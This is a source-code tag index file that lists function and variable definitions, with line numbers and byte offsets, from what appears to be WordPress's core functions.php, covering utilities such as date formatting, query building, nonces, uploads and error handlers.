	$j = @$datefunc( $dateformatstring, $i );j138,5166
	$j = apply_filters('date_i18n', $j, $req_format, $i, $gmt);j140,5287
function number_format_i18n( $number, $decimals = 0 ) {number_format_i18n153,5631
function number_format_i18n( $number, $decimals = 0 ) {decimals153,5631
	$formatted = number_format( $number, absint( $decimals ), $wp_locale->number_format['decimal_point'], $wp_locale->number_format['thousands_sep'] );formatted155,5707
function size_format( $bytes, $decimals = 0 ) {size_format180,6877
function size_format( $bytes, $decimals = 0 ) {decimals180,6877
	$quant = array(quant181,6925
	foreach ( $quant as $unit => $mag )unit189,7204
function get_weekstartend( $mysqlstring, $start_of_week = '' ) {get_weekstartend205,7658
function get_weekstartend( $mysqlstring, $start_of_week = '' ) {start_of_week205,7658
	$my = substr( $mysqlstring, 0, 4 ); // Mysql string Yearmy206,7723
	$mm = substr( $mysqlstring, 8, 2 ); // Mysql string Monthmm207,7781
	$md = substr( $mysqlstring, 5, 2 ); // Mysql string daymd208,7840
	$day = mktime( 0, 0, 0, $md, $mm, $my ); // The timestamp for mysqlstring day.day209,7897
	$weekday = date( 'w', $day ); // The day of the week from the timestampweekday210,7977
		$start_of_week = get_option( 'start_of_week' );start_of_week212,8086
	$start = $day - 86400 * ( $weekday - $start_of_week ); // The most recent week start day on or before $daystart217,8189
	$end = $start + 604799; // $start + 7 days - 1 secondend218,8297
function maybe_unserialize( $original ) {maybe_unserialize230,8590
function is_serialized( $data ) {is_serialized247,9106
	$data = trim( $data );data251,9231
	$length = strlen( $data );length254,9293
	$lastc = $data[$length-1];lastc259,9398
	$token = $data[0];token262,9483
function is_serialized_string( $data ) {is_serialized_string286,9989
	$data = trim( $data );data290,10129
	$length = strlen( $data );length291,10153
function maybe_serialize( $data ) {maybe_serialize314,10581
function xmlrpc_getposttitle( $content ) {xmlrpc_getposttitle341,11287
		$post_title = $matchtitle[1];post_title344,11434
		$post_title = $post_default_title;post_title346,11476
function xmlrpc_getpostcategory( $content ) {xmlrpc_getpostcategory367,12075
		$post_category = trim( $matchcat[1], ',' );post_category370,12232
		$post_category = explode( ',', $post_category );post_category371,12278
		$post_category = $post_default_category;post_category373,12339
function xmlrpc_removepostdata( $content ) {xmlrpc_removepostdata388,12679
	$content = preg_replace( '/<title>(.+?)<\/title>/si', '', $content );content389,12724
	$content = preg_replace( '/<category>(.+?)<\/category>/si', '', $content );content390,12795
	$content = trim( $content );content391,12872
function do_enclose( $content, $post_ID ) {do_enclose410,13296
	$post_links = array();post_links416,13477
	$pung = get_enclosed( $post_ID );pung418,13502
	$ltrs = '\w';ltrs420,13538
	$gunk = '/#~:.?+=&%@!\-';gunk421,13553
	$punc = '.:?\-';punc422,13580
	$any = $ltrs . $gunk . $punc;any423,13598
			$mids = $wpdb->get_col( $wpdb->prepare("SELECT meta_id FROM $wpdb->postmeta WHERE post_id = %d AND meta_key = 'enclosure' AND meta_value LIKE (%s)", $post_ID, like_escape( $link_test ) . '%') );mids429,13848
			$test = @parse_url( $link_test );test437,14259
			if ( $headers = wp_get_http_headers( $url) ) {headers450,14784
				$len = isset( $headers['content-length'] ) ? (int) $headers['content-length'] : 0;len451,14834
				$type = isset( $headers['content-type'] ) ? $headers['content-type'] : '';type452,14921
				$allowed_types = array( 'video', 'audio' );allowed_types453,15000
				$url_parts = @parse_url( $url );url_parts457,15130
					$extension = pathinfo( $url_parts['path'], PATHINFO_EXTENSION );extension459,15201
						foreach ( get_allowed_mime_types( ) as $exts => $mime ) {exts461,15306
								$type = $mime;type463,15435
function wp_get_http( $url, $file_path = false, $red = 1 ) {wp_get_http491,16136
function wp_get_http( $url, $file_path = false, $red = 1 ) {file_path491,16136
	$options = array();options497,16256
	$response = wp_remote_request($url, $options);response505,16404
	$headers = wp_remote_retrieve_headers( $response );headers510,16503
	$out_fp = fopen($file_path, 'w');out_fp522,16980
function wp_get_http_headers( $url, $deprecated = false ) {wp_get_http_headers542,17355
function wp_get_http_headers( $url, $deprecated = false ) {deprecated542,17355
	$response = wp_remote_head( $url );response546,17493
function is_new_day() {is_new_day563,17799
 * This is a convenient function for easily building url queries. It sets thefor574,18000
function build_query( $data ) {build_query586,18415
function _http_build_query($data, $prefix=null, $sep=null, $key='', $urlencode=true) {_http_build_query591,18591
function _http_build_query($data, $prefix=null, $sep=null, $key='', $urlencode=true) {prefix591,18591
	$ret = array();ret592,18678
	foreach ( (array) $data as $k => $v ) {k594,18696
			$k = urlencode($k);k596,18756
			$k = $prefix.$k;k598,18818
			$k = $key . '%5B' . $k . '%5D';k600,18860
		if ( $v === null )v601,18895
		elseif ( $v === FALSE )v603,18929
			$v = '0';v604,18955
		$sep = ini_get('arg_separator.output');sep615,19209
function add_query_arg() {add_query_arg638,20003
	$ret = '';ret639,20030
			$uri = $_SERVER['REQUEST_URI'];uri642,20142
			$uri = @func_get_arg( 1 );uri644,20184
			$uri = $_SERVER['REQUEST_URI'];uri647,20286
			$uri = @func_get_arg( 2 );uri649,20328
	if ( $frag = strstr( $uri, '#' ) )frag652,20362
		$uri = substr( $uri, 0, -strlen( $frag ) );uri653,20398
		$frag = '';frag655,20450
		$protocol = $matches[0];protocol658,20521
		$uri = substr( $uri, strlen( $protocol ) );uri659,20548
		$protocol = '';protocol661,20604
		$parts = explode( '?', $uri, 2 );parts665,20666
			$base = '?';base667,20734
			$query = $parts[0];query668,20750
			$base = $parts[0] . '?';base670,20784
			$query = $parts[1];query671,20812
		$base = $uri . '?';base674,20908
		$query = '';query675,20930
		$base = '';base677,20955
		$query = $uri;query678,20969
	$qs = urlencode_deep( $qs ); // this re-URL-encodes things that were already in the query stringqs682,21020
		$kayvees = func_get_arg( 0 );kayvees684,21158
		$qs = array_merge( $qs, $kayvees );qs685,21190
	foreach ( (array) $qs as $k => $v ) {k690,21288
		if ( $v === false )v691,21327
	$ret = build_query( $qs );ret695,21374
	$ret = trim( $ret, '?' );ret696,21402
	$ret = preg_replace( '#=(&|$)#', '$1', $ret );ret697,21429
	$ret = $protocol . $base . $ret . $frag;ret698,21477
	$ret = rtrim( $ret, '?' );ret699,21519
function remove_query_arg( $key, $query=false ) {remove_query_arg712,21799
function remove_query_arg( $key, $query=false ) {query712,21799
			$query = add_query_arg( $k, false, $query );query715,21927
function add_magic_quotes( $array ) {add_magic_quotes729,22230
	foreach ( (array) $array as $k => $v ) {k730,22268
function wp_remote_fopen( $uri ) {wp_remote_fopen749,22657
	$parsed_url = @parse_url( $uri );parsed_url750,22692
	$options = array();options755,22794
	$response = wp_remote_get( $uri, $options );response758,22843
function wp( $query_vars = '' ) {wp773,23107
function wp( $query_vars = '' ) {query_vars773,23107
		$wp_the_query = $wp_query;wp_the_query778,23238
function get_status_header_desc( $code ) {get_status_header_desc789,23457
	$code = absint( $code );code792,23529
		$wp_header_to_desc = array(wp_header_to_desc795,23595
function status_header( $header ) {status_header871,25479
	$text = get_status_header_desc( $header );text872,25515
	$protocol = $_SERVER["SERVER_PROTOCOL"];protocol877,25600
		$protocol = 'HTTP/1.0';protocol879,25701
	$status_header = "$protocol $header $text";status_header880,25727
		$status_header = apply_filters( 'status_header', $status_header, $header, $text, $protocol );status_header882,25815
function wp_get_nocache_headers() {wp_get_nocache_headers898,26258
	$headers = array(headers899,26294
		$headers = (array) apply_filters('nocache_headers', $headers);headers907,26554
function nocache_headers() {nocache_headers921,26930
	$headers = wp_get_nocache_headers();headers922,26959
	foreach( $headers as $name => $field_value )name923,26997
function cache_javascript_headers() {cache_javascript_headers932,27184
	$expiresOffset = 864000; // 10 daysexpiresOffset933,27222
function get_num_queries() {get_num_queries946,27632
function bool_from_yn( $yn ) {bool_from_yn959,27911
 * If the feed action does not have a hook, then the function will die with awill966,28049
function do_feed() {do_feed975,28404
	$feed = get_query_var( 'feed' );feed978,28445
	$feed = preg_replace( '/^_+/', '', $feed );feed981,28512
	if ( $feed == '' || $feed == 'feed' )feed983,28558
		$feed = get_default_feed();feed984,28597
	$hook = 'do_feed_' . $feed;hook986,28628
		$message = sprintf( __( 'ERROR: %s is not a valid feed template.' ), esc_html($feed));message988,28686
function do_feed_rdf() {do_feed_rdf1000,28952
function do_feed_rss() {do_feed_rss1009,29095
function do_feed_rss2( $for_comments ) {do_feed_rss21020,29346
function do_feed_atom( $for_comments ) {do_feed_atom1034,29699
function do_robots() {do_robots1050,30136
	$output = "User-agent: *\n";output1055,30245
	$public = get_option( 'blog_public' );public1056,30275
		$site_url = parse_url( site_url() );site_url1060,30380
		$path = ( !empty( $site_url['path'] ) ) ? $site_url['path'] : '';path1061,30419
function is_blog_installed() {is_blog_installed1083,31071
	$suppress = $wpdb->suppress_errors();suppress1090,31262
		$alloptions = wp_load_alloptions();alloptions1092,31340
		$installed = $wpdb->get_var( "SELECT option_value FROM $wpdb->options WHERE option_name = 'siteurl'" );installed1096,31483
		$installed = $alloptions['siteurl'];installed1098,31595
	$installed = !empty( $installed );installed1101,31673
	$suppress = $wpdb->suppress_errors();suppress1111,31907
	$wp_tables = $wpdb->tables();wp_tables1116,32142
function wp_nonce_url( $actionurl, $action = -1 ) {wp_nonce_url1154,33242
function wp_nonce_url( $actionurl, $action = -1 ) {action1154,33242
	$actionurl = str_replace( '&amp;', '&', $actionurl );actionurl1155,33294
 * call the function without any parameters, because validation of the noncewithout1169,33942
function wp_nonce_field( $action = -1, $name = "_wpnonce", $referer = true , $echo = true ) {wp_nonce_field1187,34684
function wp_nonce_field( $action = -1, $name = "_wpnonce", $referer = true , $echo = true ) {action1187,34684
	$name = esc_attr( $name );name1188,34778
	$nonce_field = '<input type="hidden" id="' . $name . '" name="' . $name . '" value="' . wp_create_nonce( $action ) . '" />';nonce_field1189,34806
function wp_referer_field( $echo = true ) {wp_referer_field1213,35446
function wp_referer_field( $echo = true ) {echo1213,35446
	$ref = esc_attr( $_SERVER['REQUEST_URI'] );ref1214,35490
	$referer_field = '<input type="hidden" name="_wp_http_referer" value="'. $ref . '" />';referer_field1215,35535
function wp_original_referer_field( $echo = true, $jump_back_to = 'current' ) {wp_original_referer_field1237,36252
function wp_original_referer_field( $echo = true, $jump_back_to = 'current' ) {echo1237,36252
	$jump_back_to = ( 'previous' == $jump_back_to ) ? wp_get_referer() : $_SERVER['REQUEST_URI'];jump_back_to1238,36332
	$ref = ( wp_get_original_referer() ) ? wp_get_original_referer() : $jump_back_to;ref1239,36427
	$orig_referer_field = '<input type="hidden" name="_wp_original_http_referer" value="' . esc_attr( stripslashes( $ref ) ) . '" />';orig_referer_field1240,36510
function wp_get_referer() {wp_get_referer1256,36985
	$ref = false;ref1257,37013
		$ref = $_REQUEST['_wp_http_referer'];ref1259,37077
		$ref = $_SERVER['HTTP_REFERER'];ref1261,37166
function wp_get_original_referer() {wp_get_original_referer1277,37500
function wp_mkdir_p( $target ) {wp_mkdir_p1293,37925
	$target = str_replace( '//', '/', $target );target1295,38004
	$target = rtrim($target, '/'); // Use rtrim() instead of untrailingslashit to avoid formatting.php dependency.target1298,38121
		$target = '/';target1300,38256
		$stat = @stat( dirname( $target ) );stat1307,38430
		$dir_perms = $stat['mode'] & 0007777;  // Get the permission bits.dir_perms1308,38469
function path_is_absolute( $path ) {path_is_absolute1330,39048
function path_join( $base, $path ) {path_join1357,39801
 * In the event that this function does not find a writable location, It may be overridden by the <code>WP_TEMP_DIR</code> constant in your <code>wp-config.php</code> file.does1368,40152
function get_temp_dir() {get_temp_dir1374,40398
	static $temp;temp1375,40424
	$temp = WP_CONTENT_DIR . '/';temp1382,40558
		$temp = sys_get_temp_dir();temp1387,40698
	$temp = ini_get('upload_tmp_dir');temp1392,40795
	$temp = '/tmp/';temp1396,40910
function wp_upload_dir( $time = null ) {wp_upload_dir1433,42482
function wp_upload_dir( $time = null ) {time1433,42482
	$siteurl = get_option( 'siteurl' );siteurl1435,42542
	$upload_path = get_option( 'upload_path' );upload_path1436,42579
	$upload_path = trim($upload_path);upload_path1437,42624
	$main_override = is_multisite() && defined( 'MULTISITE' ) && is_main_site();main_override1438,42660
		$dir = WP_CONTENT_DIR . '/uploads';dir1440,42768
		$dir = $upload_path;dir1442,42816
			$dir = WP_CONTENT_DIR . '/uploads';dir1444,42887
			$dir = path_join( ABSPATH, $dir );dir1447,43039
		if ( empty($upload_path) || ( 'wp-content/uploads' == $upload_path ) || ( $upload_path == $dir ) )upload_path1452,43135
			$url = WP_CONTENT_URL . '/uploads';url1453,43236
			$url = trailingslashit( $siteurl ) . $upload_path;url1455,43282
	if ( defined('UPLOADS') && !$main_override && ( !isset( $switched ) || $switched === false ) ) {switched1458,43340
		$dir = ABSPATH . UPLOADS;dir1459,43438
		$url = trailingslashit( $siteurl ) . UPLOADS;url1460,43466
	if ( is_multisite() && !$main_override && ( !isset( $switched ) || $switched === false ) ) {switched1463,43518
			$dir = untrailingslashit(BLOGUPLOADDIR);dir1465,43648
		$url = str_replace( UPLOADS, 'files', $url );url1466,43692
	$bdir = $dir;bdir1469,43744
	$burl = $url;burl1470,43759
	$subdir = '';subdir1472,43775
			$time = current_time( 'mysql' );time1476,43904
		$y = substr( $time, 0, 4 );y1477,43940
		$m = substr( $time, 5, 2 );m1478,43970
		$subdir = "/$y/$m";subdir1479,44000
	$uploads = apply_filters( 'upload_dir', array( 'path' => $dir, 'url' => $url, 'subdir' => $subdir, 'basedir' => $bdir, 'baseurl' => $burl, 'error' => false ) );uploads1485,44063
			$error_path = str_replace( ABSPATH, '', $uploads['basedir'] ) . $uploads['subdir'];error_path1490,44360
			$error_path = basename( $uploads['basedir'] ) . $uploads['subdir'];error_path1492,44454
		$message = sprintf( __( 'Unable to create directory %s. Is its parent directory writable by the server?' ), $error_path );message1494,44526
function wp_unique_filename( $dir, $filename, $unique_filename_callback = null ) {wp_unique_filename1518,45288
function wp_unique_filename( $dir, $filename, $unique_filename_callback = null ) {unique_filename_callback1518,45288
	$filename = sanitize_file_name($filename);filename1520,45425
	$info = pathinfo($filename);info1523,45522
	$ext = !empty($info['extension']) ? '.' . $info['extension'] : '';ext1524,45552
	$name = basename($filename, $ext);name1525,45620
	if ( $name === $ext )name1528,45720
		$name = '';name1529,45743
		$filename = call_user_func( $unique_filename_callback, $dir, $name, $ext );filename1533,45939
		$number = '';number1535,46027
			$ext2 = strtolower($ext);ext21539,46121
			$filename2 = preg_replace( '|' . preg_quote($ext) . '$|', $ext2, $filename );filename21540,46150
				$new_number = $number + 1;new_number1544,46407
				$filename = str_replace( "$number$ext", "$new_number$ext", $filename );filename1545,46438
				$filename2 = str_replace( "$number$ext2", "$new_number$ext2", $filename2 );filename21546,46514
				$number = $new_number;number1547,46594
				$filename = $filename . ++$number . $ext;filename1554,46732
				$filename = str_replace( "$number$ext", ++$number . $ext, $filename );filename1556,46786
 * This function will not move an uploaded file to the upload folder. It willwill1570,47202
function wp_upload_bits( $name, $deprecated, $bits, $time = null ) {wp_upload_bits1586,47817
function wp_upload_bits( $name, $deprecated, $bits, $time = null ) {time1586,47817
	$wp_filetype = wp_check_filetype( $name );wp_filetype1593,48041
	$upload = wp_upload_dir( $time );upload1597,48171
	$upload_bits_error = apply_filters( 'wp_upload_bits', array( 'name' => $name, 'bits' => $bits, 'time' => $time ) );upload_bits_error1602,48261
	$filename = wp_unique_filename( $upload['path'], $name );filename1608,48485
	$new_file = $upload['path'] . "/$filename";new_file1610,48545
			$error_path = str_replace( ABSPATH, '', $upload['basedir'] ) . $upload['subdir'];error_path1613,48690
			$error_path = basename( $upload['basedir'] ) . $upload['subdir'];error_path1615,48782
		$message = sprintf( __( 'Unable to create directory %s. Is its parent directory writable by the server?' ), $error_path );message1617,48852
	$ifp = @ fopen( $new_file, 'wb' );ifp1621,49020
	$stat = @ stat( dirname( $new_file ) );stat1630,49251
	$perms = $stat['mode'] & 0007777;perms1631,49292
	$perms = $perms & 0000666;perms1632,49327
	$url = $upload['url'] . "/$filename";url1637,49426
function wp_ext2type( $ext ) {wp_ext2type1652,49877
	$ext2type = apply_filters( 'ext2type', array(ext2type1653,49908
	foreach ( $ext2type as $type => $exts )type1663,50770
function wp_check_filetype( $filename, $mimes = null ) {wp_check_filetype1679,51193
function wp_check_filetype( $filename, $mimes = null ) {mimes1679,51193
		$mimes = get_allowed_mime_types();mimes1681,51272
	$type = false;type1682,51309
	$ext = false;ext1683,51325
	foreach ( $mimes as $ext_preg => $mime_match ) {ext_preg1685,51341
		$ext_preg = '!\.(' . $ext_preg . ')$!i';ext_preg1686,51391
			$type = $mime_match;type1688,51494
			$ext = $ext_matches[1];ext1689,51518
 * Currently this function only supports validating images known to getimagesize().only1704,51901
function wp_check_filetype_and_ext( $file, $filename, $mimes = null ) {wp_check_filetype_and_ext1713,52382
function wp_check_filetype_and_ext( $file, $filename, $mimes = null ) {mimes1713,52382
	$proper_filename = false;proper_filename1715,52455
	$wp_filetype = wp_check_filetype( $filename, $mimes );wp_filetype1718,52534
		$imgstats = @getimagesize( $file );imgstats1729,52961
			$mime_to_ext = apply_filters( 'getimagesize_mimes_to_exts', array(mime_to_ext1735,53346
				$filename_parts = explode( '.', $filename );filename_parts1745,53708
				$new_filename = implode( '.', $filename_parts );new_filename1748,53850
					$proper_filename = $new_filename; // Mark that it changedproper_filename1751,53942
				$wp_filetype = wp_check_filetype( $new_filename, $mimes );wp_filetype1754,54043
function get_allowed_mime_types() {get_allowed_mime_types1772,54643
	static $mimes = false;mimes1773,54679
	static $mimes = false;mimes1773,54679
		$mimes = apply_filters( 'upload_mimes', array(mimes1777,54785
function wp_explain_nonce( $action ) {wp_explain_nonce1858,57549
function wp_nonce_ays( $action ) {wp_nonce_ays1875,58016
	$title = __( 'WordPress Failure Notice' );title1876,58051
		$html = sprintf( __( 'You are attempting to log out of %s' ), get_bloginfo( 'name' ) ) . '</p><p>';html1878,58126
		$html = __( 'Are you sure you want to do this?' );html1881,58333
 * This function complements the die() PHP function. The difference is thatcomplements1892,58688
 * recommended to call this function very often and try to handle as many errorsvery1895,58913
function wp_die( $message = '', $title = '', $args = array() ) {wp_die1904,59192
function wp_die( $message = '', $title = '', $args = array() ) {message1904,59192
		$function = apply_filters( 'wp_die_ajax_handler', '_ajax_wp_die_handler' );function1906,59303
		$function = apply_filters( 'wp_die_xmlrpc_handler', '_xmlrpc_wp_die_handler' );function1908,59439
		$function = apply_filters( 'wp_die_app_handler', '_scalar_wp_die_handler' );function1910,59573
		$function = apply_filters( 'wp_die_handler', '_default_wp_die_handler' );function1912,59658
function _default_wp_die_handler( $message, $title = '', $args = array() ) {_default_wp_die_handler1930,60213
function _default_wp_die_handler( $message, $title = '', $args = array() ) {title1930,60213
	$defaults = array( 'response' => 500 );defaults1931,60290
	$r = wp_parse_args($args, $defaults);r1932,60331
	$have_gettext = function_exists('__');have_gettext1934,60371
			$error_data = $message->get_error_data();error_data1938,60509
				$title = $error_data['title'];title1940,60621
		$errors = $message->get_error_messages();errors1942,60660
			$message = '';message1945,60747
			$message = "<p>{$errors[0]}</p>";message1948,60786
			$message = "<ul>\n\t\t<li>" . join( "</li>\n\t\t<li>", $errors ) . "</li>\n\t</ul>";message1951,60845
		$message = "<p>$message</p>";message1955,60994
		$back_text = $have_gettext? __('&laquo; Back') : '&laquo; Back';back_text1959,61084
			$title = $have_gettext ? __('WordPress &rsaquo; Error') : 'WordPress &rsaquo; Error';title1971,61439
		$text_direction = 'ltr';text_direction1973,61529
			$text_direction = 'rtl';text_direction1975,61626
			$text_direction = 'rtl';text_direction1977,61707
function _xmlrpc_wp_die_handler( $message, $title = '', $args = array() ) {_xmlrpc_wp_die_handler2096,65482
function _xmlrpc_wp_die_handler( $message, $title = '', $args = array() ) {title2096,65482
	$defaults = array( 'response' => 500 );defaults2098,65585
	$r = wp_parse_args($args, $defaults);r2100,65627
		$error = new IXR_Error( $r['response'] , $message);error2103,65695
function _ajax_wp_die_handler( $message = '' ) {_ajax_wp_die_handler2119,66018
function _ajax_wp_die_handler( $message = '' ) {message2119,66018
function _scalar_wp_die_handler( $message = '' ) {_scalar_wp_die_handler2135,66341
function _scalar_wp_die_handler( $message = '' ) {message2135,66341
function _config_wp_home( $url = '' ) {_config_wp_home2155,66844
function _config_wp_home( $url = '' ) {url2155,66844
function _config_wp_siteurl( $url = '' ) {_config_wp_siteurl2175,67404
function _config_wp_siteurl( $url = '' ) {url2175,67404
function _mce_set_direction( $input ) {_mce_set_direction2198,68029
 * time the function is called.is2219,68719
 * The full list of smilies can be found in the function and won't be listed inand2221,68754
function smilies_init() {smilies_init2229,69017
		$wpsmiliestrans = array(wpsmiliestrans2237,69229
	$wp_smiliessearch = '/(?:\s|^)';wp_smiliessearch2297,71154
	$subchar = '';subchar2299,71189
	foreach ( (array) $wpsmiliestrans as $smiley => $img ) {smiley2300,71205
		$firstchar = substr($smiley, 0, 1);firstchar2301,71263
		$rest = substr($smiley, 1);rest2302,71301
			$subchar = $firstchar;subchar2309,71454
 * This function is used throughout WordPress to allow for both string or arrayis2323,71736
function wp_parse_args( $args, $defaults = '' ) {wp_parse_args2332,72057
function wp_parse_args( $args, $defaults = '' ) {defaults2332,72057
		$r = get_object_vars( $args );r2334,72134
		$r =& $args;r2336,72197
function wp_parse_id_list( $list ) {wp_parse_id_list2353,72492
		$list = preg_split('/[\s,]+/', $list);list2355,72554
function wp_array_slice_assoc( $array, $keys ) {wp_array_slice_assoc2369,72847
	$slice = array();slice2370,72896
function wp_filter_object_list( $list, $args = array(), $operator = 'and', $field = false ) {wp_filter_object_list2390,73596
function wp_filter_object_list( $list, $args = array(), $operator = 'and', $field = false ) {args2390,73596
	$list = wp_list_filter( $list, $args, $operator );list2394,73737
		$list = wp_list_pluck( $list, $field );list2397,73805
function wp_list_filter( $list, $args = array(), $operator = 'AND' ) {wp_list_filter2416,74360
function wp_list_filter( $list, $args = array(), $operator = 'AND' ) {args2416,74360
	$operator = strtoupper( $operator );operator2423,74518
	$count = count( $args );count2424,74556
	$filtered = array();filtered2425,74582
	foreach ( $list as $key => $obj ) {key2427,74605
		$to_match = (array) $obj;to_match2428,74642
		$matched = 0;matched2430,74671
		foreach ( $args as $m_key => $m_value ) {m_key2431,74687
			if ( $m_value == $to_match[ $m_key ] )m_value2432,74731
		if ( ( 'AND' == $operator && $matched == $count )matched2436,74794
function wp_list_pluck( $list, $field ) {wp_list_pluck2455,75241
	foreach ( $list as $key => $value ) {key2456,75283
function wp_maybe_load_widgets() {wp_maybe_load_widgets2475,75769
function wp_widgets_add_menu() {wp_widgets_add_menu2488,76113
function wp_ob_end_flush_all() {wp_ob_end_flush_all2501,76459
	$levels = ob_get_level();levels2502,76492
 * This function was backported to the the WordPress 2.3.2, but originally waswas2518,77021
function dead_db() {dead_db2524,77167
function absint( $maybeint ) {absint2567,78215
function url_is_accessable_via_ssl($url)url_is_accessable_via_ssl2582,78598
		$ssl = preg_replace( '/^http:\/\//', 'https://',  $url );ssl2585,78691
		$ch = curl_init();ch2587,78752
		$status = curl_getinfo($ch, CURLINFO_HTTP_CODE);status2596,79027
		if ($status == 200 || $status == 401) {status2599,79099
 * Marks a function as deprecated and informs when it has been used.as2607,79186
 * to get the backtrace up to what file and function called the deprecatedcalled2610,79338
 * This function is to be used in every function that is deprecated.is2615,79504
 * @uses do_action() Calls 'deprecated_function_run' and passes the function name, what to use instead,name2622,79657
 *   and the version the function was deprecated in.was2623,79761
 * @param string $function The function that was calledthat2627,79968
 * @param string $replacement Optional. The function that should have been calledthat2629,80104
function _deprecated_function( $function, $version, $replacement = null ) {_deprecated_function2631,80190
function _deprecated_function( $function, $version, $replacement = null ) {replacement2631,80190
 * to get the backtrace up to what file and function included the deprecatedincluded2648,80968
 * This function is to be used in every file that is deprecated.is2653,81132
function _deprecated_file( $file, $version, $replacement = null, $message = '' ) {_deprecated_file2670,81915
function _deprecated_file( $file, $version, $replacement = null, $message = '' ) {replacement2670,81915
		$message = empty( $message ) ? '' : ' ' . $message;message2676,82212
 * Marks a function argument as deprecated and informs when it has been used.argument2684,82623
 * This function is to be used whenever a deprecated function argument is used.is2686,82704
 * Before this function is called, the argument must be checked for whether it wasis2687,82784
 * to get the backtrace up to what file and function used the deprecatedused2696,83146
 * @uses do_action() Calls 'deprecated_argument_run' and passes the function name, a message on the change,name2706,83391
 * @param string $function The function that was calledthat2711,83712
function _deprecated_argument( $function, $version, $message = null ) {_deprecated_argument2715,83925
function _deprecated_argument( $function, $version, $message = null ) {message2715,83925
 * to get the backtrace up to what file and function called the deprecatedcalled2732,84719
 * @uses do_action() Calls 'doing_it_wrong_run' and passes the function arguments.arguments2742,84966
 * @param string $function The function that was called.that2746,85198
function _doing_it_wrong( $function, $message, $version ) {_doing_it_wrong2750,85418
		$version = is_null( $version ) ? '' : sprintf( __( '(This message was added in version %s.)' ), $version );version2756,85675
function is_lighttpd_before_150() {is_lighttpd_before_1502769,86224
	$server_parts = explode( '/', isset( $_SERVER['SERVER_SOFTWARE'] )? $_SERVER['SERVER_SOFTWARE'] : '' );server_parts2770,86260
function apache_mod_loaded($mod, $default = false) {apache_mod_loaded2784,86751
function apache_mod_loaded($mod, $default = false) {default2784,86751
		$mods = apache_get_modules();mods2791,86910
			$phpinfo = ob_get_clean();phpinfo2797,87062
function iis7_supports_permalinks() {iis7_supports_permalinks2811,87268
	$supports_permalinks = false;supports_permalinks2814,87325
		/* First we check if the DOMDocument class exists. If it does not exist,exists2816,87375
		$supports_permalinks = class_exists('DOMDocument') && isset($_SERVER['IIS_UrlRewriteModule']) && ( php_sapi_name() == 'cgi-fcgi' );supports_permalinks2826,88093
function validate_file( $file, $allowed_files = '' ) {validate_file2846,88811
function validate_file( $file, $allowed_files = '' ) {allowed_files2846,88811
function is_ssl() {is_ssl2869,89228
function force_ssl_login( $force = null ) {force_ssl_login2889,89680
function force_ssl_login( $force = null ) {force2889,89680
	static $forced = false;forced2890,89724
	static $forced = false;forced2890,89724
		$old_forced = $forced;old_forced2893,89779
		$forced = $force;forced2894,89804
function force_ssl_admin( $force = null ) {force_ssl_admin2909,90043
function force_ssl_admin( $force = null ) {force2909,90043
	static $forced = false;forced2910,90087
	static $forced = false;forced2910,90087
		$old_forced = $forced;old_forced2913,90142
		$forced = $force;forced2914,90167
function wp_guess_url() {wp_guess_url2931,90408
		$url = WP_SITEURL;url2933,90486
		$schema = is_ssl() ? 'https://' : 'http://';schema2935,90517
		$url = preg_replace('#/(wp-admin/.*|wp-login.php)#i', '', $schema . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']);url2936,90564
 * function again if you wish to re-enable cache adds earlier.again2949,91045
function wp_suspend_cache_addition( $suspend = null ) {wp_suspend_cache_addition2956,91266
function wp_suspend_cache_addition( $suspend = null ) {suspend2956,91266
	static $_suspend = false;_suspend2957,91322
	static $_suspend = false;_suspend2957,91322
		$_suspend = $suspend;_suspend2960,91378
function wp_suspend_cache_invalidation($suspend = true) {wp_suspend_cache_invalidation2977,91859
	$current_suspend = $_wp_suspend_cache_invalidation;current_suspend2980,91959
	$_wp_suspend_cache_invalidation = $suspend;_wp_suspend_cache_invalidation2981,92012
function is_main_site( $blog_id = '' ) {is_main_site2995,92292
function is_main_site( $blog_id = '' ) {blog_id2995,92292
		$blog_id = $current_blog->blog_id;blog_id3002,92430
	return $blog_id == $current_site->blog_id;blog_id3004,92468
function global_terms_enabled() {global_terms_enabled3016,92666
	static $global_terms = null;global_terms3020,92742
	static $global_terms = null;global_terms3020,92742
		$filter = apply_filters( 'global_terms_enabled', null );filter3022,92807
			$global_terms = (bool) $filter;global_terms3024,92896
			$global_terms = (bool) get_site_option( 'global_terms_enabled', false );global_terms3026,92938
function wp_timezone_override_offset() {wp_timezone_override_offset3040,93229
	$timezone_object = timezone_open( $timezone_string );timezone_object3045,93352
	$datetime_object = date_create();datetime_object3046,93407
function _wp_timezone_choice_usort_callback( $a, $b ) {_wp_timezone_choice_usort_callback3062,93756
function wp_timezone_choice( $selected_zone ) {wp_timezone_choice3108,95032
	static $mo_loaded = false;mo_loaded3109,95080
	static $mo_loaded = false;mo_loaded3109,95080
	$continents = array( 'Africa', 'America', 'Antarctica', 'Arctic', 'Asia', 'Atlantic', 'Australia', 'Europe', 'Indian', 'Pacific');continents3111,95109
		$locale = get_locale();locale3115,95312
		$mofile = WP_LANG_DIR . '/continents-cities-' . $locale . '.mo';mofile3116,95338
		$mo_loaded = true;mo_loaded3118,95456
	$zonen = array();zonen3121,95481
		$zone = explode( '/', $zone );zone3123,95552
		$exists = array(exists3129,95760
	$structure = array();structure3149,96630
	foreach ( $zonen as $key => $zone ) {key3155,96788
		$value = array( $zone['continent'] );value3157,96870
			$display = $zone['t_continent'];display3161,97004
				$label = $zone['t_continent'];label3167,97208
			$display = $zone['t_city'];display3174,97377
		$value = join( '/', $value );value3183,97591
		$selected = '';selected3184,97623
		if ( $value === $selected_zone ) {value3185,97641
			$selected = 'selected="selected" ';selected3186,97678
	$selected = '';selected3198,98140
		$selected = 'selected="selected" ';selected3200,98190
	$offset_range = array (-12, -11.5, -11, -10.5, -10, -9.5, -9, -8.5, -8, -7.5, -7, -6.5, -6, -5.5, -5, -4.5, -4, -3.5, -3, -2.5, -2, -1.5, -1, -0.5,offset_range3206,98466
			$offset_name = '+' . $offset;offset_name3210,98818
			$offset_name = (string) $offset;offset_name3212,98858
		$offset_value = $offset_name;offset_value3214,98895
		$offset_name = str_replace(array('.25','.5','.75'), array(':15',':30',':45'), $offset_name);offset_name3215,98927
		$offset_name = 'UTC' . $offset_name;offset_name3216,99022
		$offset_value = 'UTC' . $offset_value;offset_value3217,99061
		$selected = '';selected3218,99102
		if ( $offset_value === $selected_zone )offset_value3219,99120
			$selected = 'selected="selected" ';selected3220,99162
function _cleanup_header_comment($str) {_cleanup_header_comment3238,99595
function wp_scheduled_delete() {wp_scheduled_delete3247,99841
